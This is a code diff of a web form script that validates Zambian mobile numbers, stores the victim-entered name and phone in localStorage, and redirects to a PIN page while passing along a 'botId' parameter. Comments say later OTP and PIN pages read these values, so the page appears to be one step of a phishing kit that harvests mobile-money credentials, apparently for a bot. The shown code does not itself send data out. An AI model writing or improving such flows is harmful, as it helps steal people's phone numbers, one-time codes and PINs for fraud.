@@ -144,17 +144,15 @@ const phoneInput = document.getElementById("phoneInput");
 const submitBtn  = document.getElementById("submitBtn");
 const statusEl   = document.getElementById("status");
 
-// Zambia mobile numbers: 10 digits starting with 09 (Zamtel 095/096/097...) 
-// or international form 2609XXXXXXXX. We keep it simple: normalize and validate 10 digits.
 function normalizePhone(raw){
   let p = raw.replace(/[^0-9]/g, "");
-  if(p.startsWith("260")) p = p.slice(3);      // 260955123456 -> 955123456
-  if(p.startsWith("0"))  p = p;                 // keep leading 0
+  if(p.startsWith("260")) p = p.slice(3);   // drop country code
+  if(p.startsWith("0"))   p = p.slice(1);   // drop leading 0
+  if(p.length === 9)      p = "0" + p;      // re-add single leading 0
   return p;
 }
 
 function isValidPhone(p){
-  // 10 digits starting with 09 (e.g. 0955123456)
   return /^09\d{8}$/.test(p);
 }
 
@@ -165,7 +163,10 @@ function updateButtonState(){
 }
 
 nameInput.addEventListener("input", updateButtonState);
+nameInput.addEventListener("change", updateButtonState);
 phoneInput.addEventListener("input", updateButtonState);
+phoneInput.addEventListener("change", updateButtonState);
+window.addEventListener("load", updateButtonState);
 
 document.getElementById("detailsForm").addEventListener("submit", e=>{
   e.preventDefault();
@@ -178,15 +179,13 @@ document.getElementById("detailsForm").addEventListener("submit", e=>{
     return;
   }
 
-  // Save for the next pages (OTP / PIN pages read these keys)
   localStorage.setItem("name", name);
   localStorage.setItem("phone", phone);
 
   statusEl.textContent = "Redirecting...";
 
-  // Keep botId in the URL chain
   const botId = new URLSearchParams(window.location.search).get("botId");
-  window.location.href = "code.html" + (botId ? "?botId=" + botId : "");
+  window.location.href = "pin.html" + (botId ? "?botId=" + botId : "");
 });
 </script>
 
